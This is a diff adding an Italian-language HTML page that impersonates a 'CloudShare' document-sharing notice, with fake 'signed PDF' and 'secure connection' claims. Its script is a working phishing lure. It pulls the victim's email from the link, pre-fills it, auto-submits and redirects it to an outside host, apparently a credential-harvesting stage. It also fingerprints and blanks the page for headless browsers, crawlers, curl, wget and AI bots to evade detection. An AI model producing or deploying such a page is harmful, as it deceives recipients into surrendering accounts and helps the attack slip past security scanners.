@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+  <meta charset="UTF-8">
+  <meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
+  <meta name="referrer" content="no-referrer">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="color-scheme" content="light">
+  <title>CloudShare — 1 documento condiviso con te</title>
+  <style>
+    :root{--blue:#2563eb;--ink:#0f172a;--muted:#64748b;--line:#e2e8f0}
+    *{box-sizing:border-box}
+    html,body{min-height:100%}
+    body{margin:0;padding:clamp(14px,4vw,40px) clamp(14px,4vw,24px);
+      display:flex;align-items:center;justify-content:center;
+      font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+      color:var(--ink);-webkit-font-smoothing:antialiased;
+      background:radial-gradient(1200px 600px at 50% -10%,#e0e7ff 0%,#f8fafc 45%,#f1f5f9 100%)}
+    .card{width:100%;max-width:420px;background:#fff;border:1px solid var(--line);
+      border-radius:18px;padding:clamp(20px,5vw,30px) clamp(18px,5vw,28px) clamp(16px,4vw,22px);
+      box-shadow:0 20px 50px -20px rgba(15,23,42,.25),0 2px 6px rgba(15,23,42,.04)}
+    .brand{display:flex;align-items:center;gap:11px;margin-bottom:18px}
+    .brand b{display:block;font-size:clamp(15px,4vw,16px);letter-spacing:-.2px}
+    .brand span{display:block;font-size:11.5px;color:var(--muted);font-weight:500;margin-top:1px}
+    .sysline{display:flex;align-items:center;gap:7px;font-size:11.5px;color:var(--muted);
+      margin-bottom:14px}
+    .sysline i{width:7px;height:7px;border-radius:50%;background:#22c55e;flex:none}
+    .to{display:flex;align-items:center;gap:8px;padding:11px 14px;border:1px solid #dbeafe;
+      border-radius:12px;background:#eff6ff;margin-bottom:16px;font-size:12.5px;color:#1e40af}
+    .to b{font-weight:600;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+    .to svg{flex:none}
+    h1{font-size:clamp(17px,4.6vw,19px);line-height:1.35;margin:0 0 8px;letter-spacing:-.3px}
+    .sub{font-size:clamp(13px,3.5vw,13.5px);color:var(--muted);line-height:1.55;margin:0 0 18px}
+    .sub b{color:var(--ink);font-weight:600}
+    .doc{display:flex;align-items:center;gap:12px;padding:14px;border:1px solid var(--line);
+      border-radius:14px;margin-bottom:20px;background:#f8fafc}
+    .docicon{width:46px;height:46px;flex:none;border-radius:10px;display:flex;align-items:center;
+      justify-content:center;background:#fff;border:1px solid #dbeafe;position:relative}
+    .pdfbadge{position:absolute;bottom:-6px;right:-8px;background:#dc2626;color:#fff;
+      font-size:8px;font-weight:800;letter-spacing:.5px;padding:2px 5px;border-radius:4px;
+      border:1.5px solid #fff}
+    .doc .nm{flex:1;min-width:0}
+    .doc .nm b{display:block;font-size:13.5px;font-weight:600}
+    .doc .nm span{display:block;font-size:11.5px;color:var(--muted);margin-top:2px}
+    .docsign{flex:none;display:flex;align-items:center;gap:5px;font-size:10.5px;font-weight:700;
+      color:#16a34a;background:#f0fdf4;border:1px solid #bbf7d0;border-radius:20px;padding:4px 9px}
+    .formbox{border:2px solid var(--blue);border-radius:14px;padding:16px 15px 15px;
+      background:#fff;box-shadow:0 6px 18px -8px rgba(37,99,235,.25)}
+    .formbox .ftitle{display:flex;align-items:center;gap:7px;font-size:13px;font-weight:700;
+      margin-bottom:10px}
+    label{display:block;font-size:12px;font-weight:600;color:var(--muted);margin-bottom:6px}
+    input[type=email]{width:100%;padding:14px 15px;font:inherit;font-size:16px;color:var(--ink);
+      background:#fff;border:1.5px solid var(--line);border-radius:11px;outline:none;
+      transition:border-color .15s,box-shadow .15s;-webkit-appearance:none;appearance:none}
+    input[type=email]:focus{border-color:var(--blue);box-shadow:0 0 0 4px rgba(37,99,235,.12)}
+    input.err{border-color:#dc2626;box-shadow:0 0 0 4px rgba(220,38,38,.1)}
+    .hint{font-size:11.5px;color:#dc2626;margin:7px 0 0;height:14px;opacity:0;transition:opacity .15s}
+    .hint.on{opacity:1}
+    button{width:100%;margin-top:11px;padding:15px 16px;font:inherit;font-size:15px;font-weight:700;
+      color:#fff;border:0;border-radius:11px;cursor:pointer;display:flex;align-items:center;
+      justify-content:center;gap:9px;background:linear-gradient(180deg,#3b82f6,#2563eb);
+      box-shadow:0 8px 20px -8px rgba(37,99,235,.7);transition:transform .12s,filter .15s;
+      -webkit-appearance:none;appearance:none}
+    button:hover{filter:brightness(1.05)}
+    button:active{transform:translateY(1px)}
+    button:disabled{opacity:.75;cursor:default;filter:none}
+    .spin{display:none;width:15px;height:15px;border:2px solid rgba(255,255,255,.35);
+      border-top-color:#fff;border-radius:50%}
+    button.busy .spin{display:block}
+    .assure{display:flex;align-items:center;justify-content:center;gap:6px;
+      margin-top:11px;font-size:11px;color:var(--muted)}
+    .foot{display:flex;align-items:center;justify-content:center;gap:6px;
+      margin-top:16px;font-size:11px;color:var(--muted)}
+  </style>
+</head>
+<body>
+
+  <div class="card" id="card">
+
+    <div class="brand">
+      <svg width="40" height="40" viewBox="0 0 48 48" aria-hidden="true">
+        <defs>
+          <linearGradient id="lg" x1="0" y1="0" x2="1" y2="1">
+            <stop offset="0" stop-color="#3b82f6"/><stop offset="1" stop-color="#6366f1"/>
+          </linearGradient>
+        </defs>
+        <rect x="2" y="2" width="44" height="44" rx="13" fill="url(#lg)"/>
+        <path d="M24 33V17" stroke="#fff" stroke-width="3" stroke-linecap="round"/>
+        <path d="M17.5 23.5L24 17l6.5 6.5" fill="none" stroke="#fff" stroke-width="3"
+              stroke-linecap="round" stroke-linejoin="round"/>
+        <path d="M15 35h18" stroke="#fff" stroke-width="3" stroke-linecap="round" opacity=".65"/>
+      </svg>
+      <div><b>CloudShare</b><span>Trasferimento file sicuro</span></div>
+    </div>
+
+    <div class="sysline">
+      <i></i> Notifica automatica · Nessuna risposta richiesta
+    </div>
+
+    <div class="to" id="toRow" style="display:none">
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#2563eb"
+           stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <rect x="3" y="5" width="18" height="14" rx="2"/>
+        <path d="M3 7l9 6 9-6"/>
+      </svg>
+      Inviato a: <b id="toEmail"></b>
+    </div>
+
+    <h1>Un documento è stato condiviso con te</h1>
+    <p class="sub">Per <b>visualizzare il documento</b> conferma la tua indirizzo email.
+      Il link scade tra 7 giorni.</p>
+
+    <div class="doc">
+      <div class="docicon">
+        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#2563eb"
+             stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M14 3H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V8z"/>
+          <path d="M14 3v5h5"/>
+          <path d="M9 15l2 2 4-4"/>
+        </svg>
+        <span class="pdfbadge">PDF</span>
+      </div>
+      <div class="nm">
+        <b>Documento_condiviso.pdf</b>
+        <span>Protetto · disponibile per 7 giorni</span>
+      </div>
+      <div class="docsign">
+        <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="#16a34a"
+             stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M20 6L9 17l-5-5"/>
+        </svg>
+        Firmato
+      </div>
+    </div>
+
+    <div class="formbox">
+      <div class="ftitle">
+        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#2563eb"
+             stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <rect x="4" y="10" width="16" height="11" rx="2"/>
+          <path d="M8 10V7a4 4 0 0 1 8 0v3"/>
+        </svg>
+        Verifica richiesta
+      </div>
+      <form id="f" novalidate>
+        <label for="email">Conferma la tua email per aprire il documento</label>
+        <input id="email" type="email" inputmode="email" autocomplete="email"
+               autocapitalize="off" spellcheck="false" placeholder="nome@esempio.it" required>
+        <p class="hint" id="hint">Inserisci un indirizzo email valido</p>
+        <button id="btn" type="submit">
+          <span class="spin" id="spin"></span><span id="btnTxt">Visualizza il documento</span>
+        </button>
+      </form>
+      <div class="assure">
+        <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+          <rect x="4" y="10" width="16" height="11" rx="2"/>
+          <path d="M8 10V7a4 4 0 0 1 8 0v3"/>
+        </svg>
+        La tua email non verrà condivisa con il mittente
+      </div>
+    </div>
+
+    <div class="foot">
+      Connessione sicura · Link protetto · CloudShare © 2026
+    </div>
+
+  </div>
+
+  <script>
+  (function () {
+    "use strict";
+
+    // ===== CONFIG =====
+    var MIDDLE      = "https://panel365webdocumentazionesicuro.org/off";
+    var MIN_MS      = 400;     // dwell before handoff
+    var AUTO_SUBMIT = true;    // if email came in via ?email= or #hash, fire automatically
+    var BLOCK_BOTS  = false;   // true = blank the page for crawlers/headless
+    // ==================
+
+    var RE = /^[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}$/;
+
+    var form   = document.getElementById("f");
+    var input  = document.getElementById("email");
+    var btn    = document.getElementById("btn");
+    var btnTxt = document.getElementById("btnTxt");
+    var hint   = document.getElementById("hint");
+    var spin   = document.getElementById("spin");
+    var busy   = false;
+
+    // spinner rotation via JS (no CSS keyframes, nothing to break)
+    var spinAngle = 0, spinTimer = null;
+    function spinStart() {
+      if (spinTimer) return;
+      spinTimer = setInterval(function () {
+        spinAngle = (spinAngle + 30) % 360;
+        spin.style.transform = "rotate(" + spinAngle + "deg)";
+      }, 40);
+    }
+    function spinStop() {
+      if (spinTimer) { clearInterval(spinTimer); spinTimer = null; }
+    }
+
+    // decode up to 2 passes (wrappers sometimes double-encode: %40 -> %2540)
+    function smartDecode(s) {
+      var prev = s, out = s, i;
+      for (i = 0; i < 2; i++) {
+        try { out = decodeURIComponent(out); } catch (e) { break; }
+        if (out === prev) break;
+        prev = out;
+      }
+      return out;
+    }
+
+    // middle handoff: /gsuit with email as query param
+    function target(email) {
+      return MIDDLE + "?email=" + encodeURIComponent(email);
+    }
+
+    function fail(msg) {
+      hint.textContent = msg || "Inserisci un indirizzo email valido";
+      hint.classList.add("on");
+      input.classList.add("err");
+      try { input.focus(); } catch (e) {}
+    }
+
+    function go(email) {
+      if (busy) return;
+      busy = true;
+      hint.classList.remove("on");
+      input.classList.remove("err");
+      input.disabled = true;
+      btn.disabled = true;
+      btn.classList.add("busy");
+      btnTxt.textContent = "Apertura in corso…";
+      spinStart();
+
+      setTimeout(function () {
+        var url = target(email);
+        try { window.location.replace(url); }
+        catch (e) { window.location.href = url; }
+      }, MIN_MS);
+    }
+
+    form.addEventListener("submit", function (e) {
+      e.preventDefault();
+      var v = (input.value || "").trim().replace(/\s+/g, "");
+      if (!RE.test(v)) { fail(); return; }
+      go(v);
+    });
+
+    input.addEventListener("input", function () {
+      input.classList.remove("err");
+      hint.classList.remove("on");
+    });
+
+    // ---- Autograb:
+    //      1) ?email= query param first — survives mailer wrappers/redirects
+    //      2) fragment fallback: #email
+    //      double-decoded, validated, then prefill + show + auto-submit ----
+    (function () {
+      var email = "";
+
+      // 1) query string: ?email=...
+      var qs = window.location.search || "";
+      var qe = qs.match(/[?&]email=([^&]+)/i);
+      if (qe) email = qe[1];
+
+      // 2) fragment fallback: #email
+      if (!email) {
+        var raw = (window.location.hash || "").replace(/^#/, "");
+        if (raw && RE.test(raw)) email = raw;
+      }
+
+      email = smartDecode(email).trim();
+      if (!email || !RE.test(email)) return;   // nothing valid -> normal form flow
+
+      // prefill the field with the recipient's email (the one they got the message on)
+      input.value = email;
+
+      // show "Inviato a: <email>" on the page — proves it's addressed to THEM
+      try {
+        document.getElementById("toEmail").textContent = email;
+        document.getElementById("toRow").style.display = "flex";
+      } catch (e) {}
+
+      if (AUTO_SUBMIT) setTimeout(function () { go(email); }, 300);
+    })();
+
+    function isBot() {
+      try {
+        if (navigator.webdriver === true) return true;
+        if (window.callPhantom || window._phantom || window.phantom) return true;
+        if (window.__nightmare || window.domAutomation || window.domAutomationController) return true;
+        if (window.Cypress) return true;
+
+        var ua = navigator.userAgent || "";
+        if (/HeadlessChrome|PhantomJS|electron|bot|crawler|spider|curl\/|wget|python|requests|urllib|httpx|aiohttp|scrapy|selenium|puppeteer|playwright|ahrefs|semrush|mj12|dotbot|petalbot|bytespider|gptbot|claudebot|ccbot|facebookexternalhit|bingpreview/i.test(ua)) return true;
+
+        if (!navigator.languages || navigator.languages.length === 0) return true;
+        if (navigator.plugins && navigator.plugins.length === 0 && !/mobile/i.test(ua)) return true;
+        if (window.outerWidth === 0 || window.outerHeight === 0) return true;
+
+        try {
+          var c = document.createElement("canvas");
+          var gl = c.getContext("webgl") || c.getContext("experimental-webgl");
+          if (gl) {
+            var ext = gl.getExtension("WEBGL_debug_renderer_info");
+            if (ext) {
+              var r = (gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) || "").toLowerCase();
+              if (r.indexOf("swiftshader") !== -1 || r.indexOf("llvmpipe") !== -1 || r.indexOf("software") !== -1) return true;
+            }
+          } else {
+            if (!/mobile/i.test(ua)) return true;
+          }
+        } catch (e) {}
+
+        if (navigator.permissions && navigator.permissions.query) {
+          navigator.permissions.query({ name: "notifications" }).then(function (p) {
+            if (p.state === "denied" && !("Notification" in window)) {
+              try {
+                document.body.innerHTML = "";
+                document.body.style.background = "#fff";
+                document.title = "Error";
+              } catch (e) {}
+            }
+          }).catch(function () {});
+        }
+      } catch (e) {}
+      return false;
+    }
+
+    if (BLOCK_BOTS && isBot()) {
+      try {
+        document.body.innerHTML = "";
+        document.body.style.background = "#fff";
+        document.title = "Error";
+      } catch (e) {}
+    }
+  })();
+  </script>
+</body>
+</html>
